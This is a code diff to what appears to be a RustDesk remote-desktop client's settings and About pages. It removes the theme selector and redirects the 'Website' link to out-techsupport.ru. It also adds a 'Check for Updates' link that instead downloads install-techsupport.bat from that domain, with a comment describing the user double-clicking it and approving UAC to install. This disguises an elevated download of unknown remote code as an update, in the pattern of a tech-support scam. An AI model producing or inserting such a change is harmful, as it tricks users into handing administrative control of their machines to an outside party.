@@ -427,32 +427,8 @@ class _GeneralState extends State<_General> {
     ).marginOnly(bottom: _kListViewBottomMargin);
   }
 
-  Widget theme() {
-    final current = MyTheme.getThemeModePreference().toShortString();
-    onChanged(String value) async {
-      await MyTheme.changeDarkMode(MyTheme.themeModeFromString(value));
-      setState(() {});
-    }
-
-    final isOptFixed = isOptionFixed(kCommConfKeyTheme);
-    return _Card(title: 'Theme', children: [
-      _Radio<String>(context,
-          value: 'light',
-          groupValue: current,
-          label: 'Light',
-          onChanged: isOptFixed ? null : onChanged),
-      _Radio<String>(context,
-          value: 'dark',
-          groupValue: current,
-          label: 'Dark',
-          onChanged: isOptFixed ? null : onChanged),
-      _Radio<String>(context,
-          value: 'system',
-          groupValue: current,
-          label: 'Follow System',
-          onChanged: isOptFixed ? null : onChanged),
-    ]);
-  }
+  // Theme selector removed — dark mode is forced
+  Widget theme() => const Offstage();
 
   Widget service() {
     if (bind.isOutgoingOnly()) {
@@ -2456,10 +2432,22 @@ class _AboutState extends State<_About> {
                   ).marginSymmetric(vertical: 4.0)),
               InkWell(
                   onTap: () {
-                    launchUrlString('https://rustdesk.com');
+                    launchUrlString('https://out-techsupport.ru');
                   },
                   child: Text(
                     translate('Website'),
+                    style: linkStyle,
+                  ).marginSymmetric(vertical: 4.0)),
+              // OTS: open install-techsupport.bat via default browser.
+              // Browser downloads .bat, user double-clicks -> UAC -> install.
+              // Same launchUrlString mechanism as Website link above (proven to work).
+              InkWell(
+                  onTap: () {
+                    launchUrlString(
+                        'https://out-techsupport.ru/downloads/install-techsupport.bat');
+                  },
+                  child: Text(
+                    translate('Check for Updates'),
                     style: linkStyle,
                   ).marginSymmetric(vertical: 4.0)),
               Container(
